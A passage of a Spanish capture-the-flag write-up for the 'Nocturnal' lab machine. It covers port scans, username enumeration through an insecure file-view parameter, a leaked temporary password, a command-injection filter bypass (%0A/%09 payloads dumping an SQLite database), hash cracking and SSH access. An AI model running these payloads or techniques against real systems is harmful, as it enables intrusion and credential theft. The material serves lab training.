+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>​❯ sudo nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn 10.10.11.64 -oG ports
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-04-16 21:38 CEST
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 21:38
+</span></span><span style="display:flex;"><span>Scanning 10.10.11.64 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 10.10.11.64
+</span></span><span style="display:flex;"><span>Discovered open port 22/tcp on 10.10.11.64
+</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 10.10.11.64
+</span></span><span style="display:flex;"><span>Discovered open port 22/tcp on 10.10.11.64
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 21:39, 13.97s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.64
+</span></span><span style="display:flex;"><span>Host is up, received user-set <span style="color:#f92672">(</span>0.047s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2025-04-16 21:38:54 CEST <span style="color:#66d9ef">for</span> 14s
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65327</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>, <span style="color:#ae81ff">206</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE REASON
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     syn-ack ttl <span style="color:#ae81ff">63</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    syn-ack ttl <span style="color:#ae81ff">63</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 14.04 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">78164</span> <span style="color:#f92672">(</span>3.439MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">69986</span> <span style="color:#f92672">(</span>2.800MB<span style="color:#f92672">)</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ ports.py ports
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>🔍 Puertos encontrados:
+</span></span><span style="display:flex;"><span>  ➜  <span style="color:#ae81ff">22</span>
+</span></span><span style="display:flex;"><span>  ➜  <span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>¡Puertos copiados en el portapapeles!
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ sudo nmap -sCV -p22,80 10.10.11.64 -oN trageted
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> contraseña para borhub:
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-04-16 21:36 CEST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> nocturnal.htb <span style="color:#f92672">(</span>10.10.11.64<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.14s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Welcome to Nocturnal
+</span></span><span style="display:flex;"><span>| http-cookie-flags:
+</span></span><span style="display:flex;"><span>|   /:
+</span></span><span style="display:flex;"><span>|     PHPSESSID:
+</span></span><span style="display:flex;"><span>|_      httponly flag not set
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 9.68 seconds
+</span></span></code></pre></div><h1 id="enumeración-web">Enumeración web<a hidden class="anchor" aria-hidden="true" href="#enumeración-web">#</a></h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ whatweb nocturnal.htb
+</span></span><span style="display:flex;"><span>http://nocturnal.htb <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Cookies<span style="color:#f92672">[</span>PHPSESSID<span style="color:#f92672">]</span>, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, Email<span style="color:#f92672">[</span>support@nocturnal.htb<span style="color:#f92672">]</span>, HTML5, HTTPServer<span style="color:#f92672">[</span>Ubuntu Linux<span style="color:#f92672">][</span>nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)]</span>, IP<span style="color:#f92672">[</span>10.10.11.64<span style="color:#f92672">]</span>, Title<span style="color:#f92672">[</span>Welcome to Nocturnal<span style="color:#f92672">]</span>, nginx<span style="color:#f92672">[</span>1.18.0<span style="color:#f92672">]</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ gobuster dir -u http://nocturnal.htb -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t <span style="color:#ae81ff">200</span> -r
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.6
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://nocturnal.htb
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">200</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.6
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Follow Redirect:         true
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>/uploads              <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 162<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/backups              <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 162<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/uploads2             <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 162<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">220559</span> / <span style="color:#ae81ff">220560</span> <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Finished
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span></code></pre></div><p>En un principio vemos una página normal y corriente que tiene un panel de registro y otro de login. Por el momento vamos a crear una cuenta para ver el dashboard que nos muestra.</p>
+<p><img alt="Nocturnal_Machine_1" loading="lazy" src="/write-ups/linux/easy/nocturnal/Fotos/nocturnal_machine_1.png"></p>
+<p>Una vez subimos una archivo nos sale bajo del titulo Your files, y si hacemos hovering sobre el nos sale una ruta que parece que es para mostrar el archivo.</p>
+<p>Entonces provee a meterlo en la url del navegador para ver que mostraba los archivos que yo tengo guardados:</p>
+<p><img alt="Nocturnal_Machine_2" loading="lazy" src="/write-ups/linux/easy/nocturnal/Fotos/nocturnal_machine_2.png"></p>
+<p>Ahora voy a intentar hacer un listado de usuarios con ffuf para ver si puedo hacer lo mismo que he hecho con mi usuario para acceder a información a la cual actualmente no tengo acceso.</p>
+<p>Durante el listado le aplico <code>mi cookie</code> para que me permita listar y filtro las palabras con un size de 2985 ya que me estaba devolviendo falsos positivos y con el filtro encontramos los siguientes usuarios:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ ffuf -w /usr/share/SecLists/Usernames/xato-net-10-million-usernames-dup.txt -u <span style="color:#e6db74">&#34;http://nocturnal.htb/view.php?username=FUZZ&amp;file=*.pdf&#34;</span> -H <span style="color:#e6db74">&#34;Cookie: PHPSESSID=uru5g7j7mkf7ko2ttlaik57ttk&#34;</span> -fs <span style="color:#ae81ff">2985</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/
+</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>       v2.1.0
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> :: Method           : GET
+</span></span><span style="display:flex;"><span> :: URL              : http://nocturnal.htb/view.php?username<span style="color:#f92672">=</span>FUZZ&amp;file<span style="color:#f92672">=</span>*.pdf
+</span></span><span style="display:flex;"><span> :: Wordlist         : FUZZ: /usr/share/SecLists/Usernames/xato-net-10-million-usernames-dup.txt
+</span></span><span style="display:flex;"><span> :: Header           : Cookie: PHPSESSID<span style="color:#f92672">=</span>uru5g7j7mkf7ko2ttlaik57ttk
+</span></span><span style="display:flex;"><span> :: Follow redirects : false
+</span></span><span style="display:flex;"><span> :: Calibration      : false
+</span></span><span style="display:flex;"><span> :: Timeout          : <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span> :: Threads          : <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+</span></span><span style="display:flex;"><span> :: Filter           : Response size: <span style="color:#ae81ff">2985</span>
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>admin                   <span style="color:#f92672">[</span>Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 98ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>amanda                  <span style="color:#f92672">[</span>Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 193ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>tobias                  <span style="color:#f92672">[</span>Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 50ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user                    <span style="color:#f92672">[</span>Status: 200, Size: 3181, Words: 1176, Lines: 129, Duration: 43ms<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Enumero manualmente cada usuario encontrado para ver si puedo ver los archivos que contiene y en el usuario de amanda encuentro un archivo:</p>
+<p><img alt="Nocturnal_Machine_3" loading="lazy" src="/write-ups/linux/easy/nocturnal/Fotos/nocturnal_machine_3.png"></p>
+<p>Una vez descargado el .odt intento mostrar el archivo con cat pero es un binario entonces le listo el contenido y veo que tiene varios archivos dentro:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ unzip -l privacy.odt
+</span></span><span style="display:flex;"><span>Archive:  privacy.odt
+</span></span><span style="display:flex;"><span>  Length      Date    Time    Name
+</span></span><span style="display:flex;"><span>---------  ---------- -----   ----
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">39</span>  2024-10-06 21:54   mimetype
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0</span>  2024-10-06 21:54   Configurations2/accelerator/
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0</span>  2024-10-06 21:54   Configurations2/images/Bitmaps/
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0</span>  2024-10-06 21:54   Configurations2/toolpanel/
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0</span>  2024-10-06 21:54   Configurations2/floater/
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0</span>  2024-10-06 21:54   Configurations2/statusbar/
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0</span>  2024-10-06 21:54   Configurations2/toolbar/
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0</span>  2024-10-06 21:54   Configurations2/progressbar/
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0</span>  2024-10-06 21:54   Configurations2/popupmenu/
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0</span>  2024-10-06 21:54   Configurations2/menubar/
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">12346</span>  2024-10-06 21:54   styles.xml
+</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">899</span>  2024-10-06 21:54   manifest.rdf
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">4657</span>  2024-10-06 21:54   content.xml
+</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">978</span>  2024-10-06 21:54   meta.xml
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">13728</span>  2024-10-06 21:54   settings.xml
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">11843</span>  2024-10-06 21:54   Thumbnails/thumbnail.png
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">1061</span>  2024-10-06 21:54   META-INF/manifest.xml
+</span></span><span style="display:flex;"><span>---------                     -------
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">45551</span>                     <span style="color:#ae81ff">17</span> files
+</span></span></code></pre></div><p>Enumerando los archivos rápidamente vemos un mensaje a amanda en el cual le proveen de una contraseña temporal la cual debería cambiar la proxima vez que inicie sessión.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ cat content.xml
+</span></span><span style="display:flex;"><span>───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>       │ File: content.xml
+</span></span><span style="display:flex;"><span>────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1</span>   │ &lt;?xml version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1.0&#34;</span> encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>?&gt;
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">2</span>   │ &lt;office:document-content xmlns:css3t<span style="color:#f92672">=</span><span style="color:#e6db74">&#34; ...SNIP ...&lt;text:p text:style-name=&#34;</span>P1<span style="color:#e6db74">&#34;&gt;Dear &lt;text:span text:style-name=&#34;</span>T1<span style="color:#e6db74">&#34;&gt;Amanda&lt;/text:span&gt;,&lt;/t
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       │ ext:p&gt;&lt;text:p text:style-name=&#34;</span>P1<span style="color:#e6db74">&#34;&gt;Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       │  your account and our infrastructure.&lt;/text:p&gt;&lt;text:p text:style-name=&#34;</span>P1<span style="color:#e6db74">&#34;&gt;The file has been created and provided by Nocturnal&amp;apos;s IT team. If you have any questions or need additional assistance during the password change process, please do
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       │ not hesitate to contact us.&lt;/text:p&gt;&lt;text:p text:style-name=&#34;</span>P1<span style="color:#e6db74">&#34;&gt;Remember that maintaining the security of your credentials is paramount to protecting your information and that of the company. We appreciate your prompt attention to this matter.&lt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       │ /text:p&gt;&lt;text:p text:style-name=&#34;</span>P1<span style="color:#e6db74">&#34;/&gt;&lt;text:p text:style-name=&#34;</span>P1<span style="color:#e6db74">&#34;&gt;Yours sincerely,&lt;/text:p&gt;&lt;text:p text:style-name=&#34;</span>P1<span style="color:#e6db74">&#34;&gt;Nocturnal&amp;apos;s IT team&lt;/text:p&gt;&lt;/office:text&gt;&lt;/office:body&gt;&lt;/office:document-content&gt;
+</span></span></span></code></pre></div><p>Provamos a iniciar sesión con su usuario y la contraseña y accedemos al usuario amanda. Lo interesante es que posiblemente amanda sea una administradora de la aplicación web ya que en su usuario nos muestra el panel de administrador:</p>
+<p><img alt="Nocturnal_Machine_4" loading="lazy" src="/write-ups/linux/easy/nocturnal/Fotos/nocturnal_machine_4.png"></p>
+<p><img alt="Nocturnal_Machine_5" loading="lazy" src="/write-ups/linux/easy/nocturnal/Fotos/nocturnal_machine_5.png"></p>
+<h1 id="acceso-inicial">Acceso Inicial<a hidden class="anchor" aria-hidden="true" href="#acceso-inicial">#</a></h1>
+<p>Investigando en el código sobre la estructura del admin panel he encontrado una posible base de datos de la que coger credenciales para acceder a la máquina victima:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#Base de datos archivo dashboard.php</span>
+</span></span><span style="display:flex;"><span>$db <span style="color:#f92672">=</span> new SQLite3<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;../nocturnal_database/nocturnal_database.db&#39;</span><span style="color:#f92672">)</span>;
+</span></span></code></pre></div><p>Y también vemos que tenemos una función en el panel del admin para crear una backup del contenido existente, mirando el código he visto la posibilidad de una inyección de comandos.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">#Tenemos una función que bloquea la entrada de ciertos carácteres especiales y si se detecta devuelve un false
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">cleanEntry</span>($entry) {
+</span></span><span style="display:flex;"><span>    $blacklist_chars <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;;&#39;</span>, <span style="color:#e6db74">&#39;&amp;&#39;</span>, <span style="color:#e6db74">&#39;|&#39;</span>, <span style="color:#e6db74">&#39;$&#39;</span>, <span style="color:#e6db74">&#39; &#39;</span>, <span style="color:#e6db74">&#39;`&#39;</span>, <span style="color:#e6db74">&#39;{&#39;</span>, <span style="color:#e6db74">&#39;}&#39;</span>, <span style="color:#e6db74">&#39;&amp;&amp;&#39;</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">foreach</span> ($blacklist_chars <span style="color:#66d9ef">as</span> $char) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strpos</span>($entry, $char) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>; <span style="color:#75715e">// Malicious input detected
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#En el caso de que la función devuelva un false, $password será igual a false y nos saldrá un mensaje de error
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;backup&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#39;password&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    $password <span style="color:#f92672">=</span> <span style="color:#a6e22e">cleanEntry</span>($_POST[<span style="color:#e6db74">&#39;password&#39;</span>]);
+</span></span><span style="display:flex;"><span>    $backupFile <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;backups/backup_&#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">date</span>(<span style="color:#e6db74">&#39;Y-m-d&#39;</span>) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;.zip&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($password <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;div class=&#39;error-message&#39;&gt;Error: Try another password.&lt;/div&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Pero en el caso de que consigamos hacerle un bypass a la función, tendremos un posible RCE. Ya que nos guarda el payload en $command.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$command <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;zip -x &#39;./backups/*&#39; -r -P &#34;</span> <span style="color:#f92672">.</span> $password <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34; &#34;</span> <span style="color:#f92672">.</span> $backupFile <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34; .  &gt; &#34;</span> <span style="color:#f92672">.</span> $logFile <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34; 2&gt;&amp;1 &amp;&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Que luego es ejecutado con proc_open:
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$process <span style="color:#f92672">=</span> <span style="color:#a6e22e">proc_open</span>($command, $descriptor_spec, $pipes);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">is_resource</span>($process)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">proc_close</span>($process);
+</span></span><span style="display:flex;"><span>        }
+</span></span></code></pre></div><p>Pruebo a usar el siguiente payload capturando la petición con burpsuit para hacerle el bypass al código:</p>
+<pre tabindex="0"><code>password=%0Abash%09-c%09&#34;whoami&#34;%0A&amp;backup=
+www-data
+</code></pre><blockquote>
+<p>Al parecer usando <code>%0A (salto de linia)</code> para separar lo que sería el comando zip y ejecutar una bash funciona y usando <code>%09 (tab)</code> para usarlo como espacio nos permite hacerle un bypass a los fitros.</p>
+</blockquote>
+<p>Anteriormente habíamos visto que tenia una base de datos y que usaba sqlite3, entonces ahora vamos a intentar dumpearnos la base de datos:</p>
+<pre tabindex="0"><code>password=%0Abash%09-c%09&#34;sqlite3%09/var/www/nocturnal_database/nocturnal_database.db%09.dump%09&gt;%09/tmp/tst.txt&#34;%0A&amp;backup=
+</code></pre><p><img alt="Nocturnal_Machine_6" loading="lazy" src="/write-ups/linux/easy/nocturnal/Fotos/nocturnal_machine_6.png"></p>
+<p>Una vez hemos obtenido los hashes de la base de datos le hacemos un ataque por fuerza bruta para romperlos. Una vez finalizado el ataque hemos podido obtener la contraseña del usuario tobias.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ hashcat -m <span style="color:#ae81ff">0</span> datos /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt
+</span></span><span style="display:flex;"><span>hashcat <span style="color:#f92672">(</span>v6.2.6<span style="color:#f92672">)</span> starting
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...SNIP...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>55c82b1ccd55ab219b3b109b07d5061d:slowmotionapocalypse
+</span></span><span style="display:flex;"><span>Approaching final keyspace - workload adjusted.
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ ssh tobias@10.10.11.64
+</span></span><span style="display:flex;"><span>The authenticity of host <span style="color:#e6db74">&#39;10.10.11.64 (10.10.11.64)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ED25519 key fingerprint is SHA256:rpVMGW27qcXKI/SxVXhvpF6Qi8BorsH7RNh1jzi8VYc.
